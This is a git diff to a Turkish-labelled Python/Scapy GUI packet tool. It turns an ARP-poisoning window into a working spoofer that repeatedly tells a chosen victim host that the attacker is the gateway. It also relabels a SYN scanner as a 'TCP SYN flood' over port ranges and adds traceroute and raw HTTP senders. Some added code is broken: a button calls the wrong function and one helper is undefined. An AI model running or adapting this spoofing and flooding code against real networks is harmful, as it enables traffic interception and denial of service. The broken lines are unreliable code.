@@ -74,18 +74,24 @@ def ARPpoisoning():
     arpzehri.geometry("300x200+300+100")
     label = Label(arpzehri,text="Hedef host(Kurban)")
     label.grid(row=0,sticky=tk.W)
-    kurban = tk.Text(arpzehri, width=15, height=1)
-    kurban.insert(tk.INSERT, "0.0.0.0")
-    kurban.grid(row=0, column=1)
+    kurbanci = tk.Entry(arpzehri)
+    kurbanci.insert(tk.INSERT, "0.0.0.0")
+    kurbanci.grid(row=0, column=1)
 	
-    label = Label(arpzehri,text="Taklit edilecek host")
+    label = Label(arpzehri,text="Gateway adresi")
+    label.grid(row=2,sticky=tk.W)
+    gatway = tk.Entry(arpzehri)
+    gatway.insert(tk.INSERT, "0.0.0.0")
+    gatway.grid(row=2, column=1)
+    
+    label = Label(arpzehri,text="Hedef MAC adres")
     label.grid(row=1,sticky=tk.W)
-    taklit = tk.Text(arpzehri, width=15, height=1)
-    taklit.insert(tk.INSERT, "0.0.0.0")
-    taklit.grid(row=1, column=1)
+    kurbanciMAC = tk.Entry(arpzehri)
+    kurbanciMAC.insert(tk.INSERT, "0.0.0.0")
+    kurbanciMAC.grid(row=1, column=1)
     def gonder():
     
-        paket = Ether()/ARP(op="who-has",psrc=taklit.get(1.0, 1.15),pdst=kurban.get(1.0, 1.15))
+        paket = Ether(dst=kurbanciMAC.get())/ARP(op="who-has",psrc=gatway.get(),pdst=kurbanci.get())
         if running==True:
             sendp(paket)
             time.sleep(1.5)
@@ -100,8 +106,8 @@ def ARPpoisoning():
         global running
         running = False
         gonder()
-    butonGonder = tk.Button(arpzehri, text='Gönder', command=start).grid(row=2, sticky=tk.W)
-    butonStop = tk.Button(arpzehri, text='Stop', command=stop).grid(row=2, column=1)
+    butonGonder = tk.Button(arpzehri, text='Gönder', command=start).grid(row=3, sticky=tk.W)
+    butonStop = tk.Button(arpzehri, text='Stop', command=stop).grid(row=3, column=1)
 menubar = tk.Menu(root)
 filemenu = tk.Menu(menubar, tearoff=0)
 def gonderPCAP():
@@ -136,16 +142,17 @@ def scanSYN():
 	
     label = Label(synscan,text="Hedef Port")
     label.grid(row=1,sticky=tk.W)
-    hedefport = tk.Text(synscan, width=5, height=1)
+    hedefport = tk.Text(synscan, width=15, height=1)
     hedefport.insert(tk.INSERT, "80")
     hedefport.grid(row=1, column=1)
     def gonder():
-        if(int(hedefport.get(1.0, 1.5))<=65535):
-            send(IP(dst=hedef.get(1.0, 1.15))/TCP(dport=int(hedefport.get(1.0, 1.5)), flags="S"))
+        buport, suport = hedefport.get(1.0,1.11).split("-")
+        if(int(buport)<=65535 and int(buport)>=0 and int(suport)<=65535 and int(suport)>=0):
+            send(IP(dst=hedef.get(1.0, 1.15))/TCP(dport=(int(buport), int(suport)), flags="S"))
     butonGonder = tk.Button(synscan, text='Gönder', command=gonder).grid(row=2, sticky=tk.W)
 
 
-editmenu.add_command(label="SYN scan", command=scanSYN)
+editmenu.add_command(label="TCP SYN flood", command=scanSYN)
 
 def tracerouteTCP():
     traceroutetcp = tk.Toplevel()
@@ -157,7 +164,8 @@ def tracerouteTCP():
     hedef.grid(row=0, column=1)
 
     def gonder():
-        send(IP(dst=hedef.get(1.0, 1.15), ttl=(0,25),id=RandShort())/TCP(flags=0x2))
+        ans,unans=sr(IP(dst=hedef.get(1.0, 1.15),ttl=(0,25))/TCP(dport=53,flags="S"))
+        ans.summary(lambda s,r: r.sprintf("%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags%}"))
     butonGonder = tk.Button(traceroutetcp, text='Gönder', command=gonder).grid(row=1, sticky=tk.W)
 editmenu.add_command(label="TCP Traceroute", command=tracerouteTCP)
 
@@ -688,22 +696,22 @@ def sel():
    if(var3.get()==5):
     R1.config(state=tk.NORMAL)
     R2.config(state=tk.NORMAL)
+    
     if(var.get()==1):
      note.select(tab1)
-     if(var2.get()==3 or var2.get()==4):
-      R3.config(state=tk.DISABLED)
-      R4.config(state=tk.DISABLED)
-      R5.config(state=tk.NORMAL)
-      
-      var2.set(0)
-      if(var4.get()==7):
-       note.select(tab5)
-    elif(var.get()==2):
+    
+    if(var.get()==2):
      R3.config(state=tk.NORMAL)
      R4.config(state=tk.NORMAL)
-     
+     R6.config(state=tk.NORMAL)
      note.select(tab2)
-    
+     if(var2.get()==3):
+      R5.config(state=tk.NORMAL)
+      note.select(tab3)
+      if(var4.get()==7):
+       
+       note.select(tab5)
+   
    if(var3.get()==5 and var.get()==2 and var2.get()==3):
     note.select(tab3)
    if(var3.get()==5 and var.get()==2 and var2.get()==4):
@@ -723,7 +731,7 @@ Separator(root, orient='horizontal').grid(column=0, row=0, columnspan=4, sticky=
 R12 = Radiobutton(root, text="Ethernet", variable=var3, value=5, command=sel)
 R12.grid(row=1, sticky=tk.W)
 
-R13 = Radiobutton(root, text="None", variable=var3, value=6, command=sel)
+R13 = Radiobutton(root, text="Non", variable=var3, value=6, command=sel)
 R13.grid(row=2, sticky=tk.W)
 	
 R1 = Radiobutton(root, text="ARP", variable=var, value=1, command=sel)
@@ -733,6 +741,10 @@ R1.config(state=tk.DISABLED)
 R2 = Radiobutton(root, text="IP", variable=var, value=2, command=sel)
 R2.grid(row=2, column=1, sticky=tk.W)
 R2.config(state=tk.DISABLED)
+
+R6 = Radiobutton(root, text="ICMP", variable=var2, value=8, command=sel)
+R6.grid(row=3, column=2, sticky=tk.W)
+R6.config(state=tk.DISABLED)
 
 R3 = Radiobutton(root, text="TCP", variable=var2, value=3, command=sel)
 R3.grid(row=1, column=2, sticky=tk.W)
@@ -749,7 +761,24 @@ R5.config(state=tk.DISABLED)
 note.add(tab5, text="HTTP")
 
 
+labelk = Label(tab5,text="Hedef IP adresi")
+labelk.grid(row=1, column=2, sticky=tk.W)
+httphedefIP = tk.Text(tab5, width=15, height=1)
+httphedefIP.insert(tk.INSERT, "0.0.0.0")
+httphedefIP.grid(row=1, column=3)
 
+
+labelk = Label(tab5,text="HTTP alanı")
+labelk.grid(row=2, column=1, sticky=tk.W)
+httpalani = tk.Text(tab5, width=30, height=10)
+httpalani.insert(tk.INSERT, "GET / HTTP/1.0")
+httpalani.grid(row=3, column=1)
+
+def gonderHTTP():
+
+    send(IP(dst=httphedefIP.get(1.0, 'end-1c'))/TCP(dport=80)/b(httpalani.get(1.0, 'end-1c')))
+
+butonGonder = tk.Button(tab5, text='Gönder', command=gonderUDP).grid(row=4, sticky=tk.W)
 note.grid(row=0, columnspan=3)
 
 #root.grid_columnconfigure(0,weight=1)
